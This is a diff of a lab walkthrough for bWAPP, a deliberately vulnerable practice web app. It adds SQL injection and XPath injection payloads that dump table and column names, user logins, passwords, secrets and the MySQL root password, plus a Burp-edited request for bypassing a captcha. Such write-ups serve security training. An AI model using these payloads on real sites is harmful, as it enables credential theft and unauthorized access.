@@ -225,12 +225,12 @@ or url incoded
 a%25'%20UNION%20ALL%20SELECT%20table_schema%2ctable_name%2c%20null%2c%20null%2c%20null%2c%20null%2c%20null%20from%20information_schema.tables%3b--%20%22
 ```
 
-![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_10_1.png)
-
+```
 a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";--
-
+```
+```
 blah%' union all select 1,login,password,email,secret,1, 1 from users --
-
+```
 ### SQL Injection (Login Form/Hero)
 useing burp
 ```
@@ -297,16 +297,38 @@ asdf',(select password from mysql.user where user='root' ))--
 ```
 
 ### XML/XPath Injection (Login Form)
+using burp
 
+to see the magic just change the id ;)
 ```
+login=bee
 password=' or id='2
+```
+or
+```
+login=bee&password=password%3d'%20or%20id%3d'2&form=submit
 ```
 
 ### XML/XPath Injection (Search)
 
+
+show passwords
 ```
 genre=')]/password | a[contains(a,'
-genre=') or contains(genre, '
+```
+show usernames
+```
+genre=')]/login | a[contains(a,'
+```
+show secrets
+```
+genre=%27)]/secret%20|%20a[contains(b,%27
+```
+show genre field
+```
+?genre=%27)]/genre%20|%20a[contains(a,%27
+```
+```
 genre=') or not(contains(genre, 'xxx') and '1'='2
 ```
 
@@ -318,13 +340,13 @@ Using Burp, do not allow the webpage to load captcha_box.php, this page loads th
 The second requirement is to prevent captcha_user from being submitted by the client. Eliminate this using Burp:
 
 ```
-POST /bWAPP/ba_captcha_bypass.php HTTP/1.1
-Host: bepp:8088
+POST /ba_captcha_bypass.php HTTP/1.1
+Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: http://bepp:8088/bWAPP/ba_captcha_bypass.php
+Referer: http://127.0.0.1/ba_captcha_bypass.php
 Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=0
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
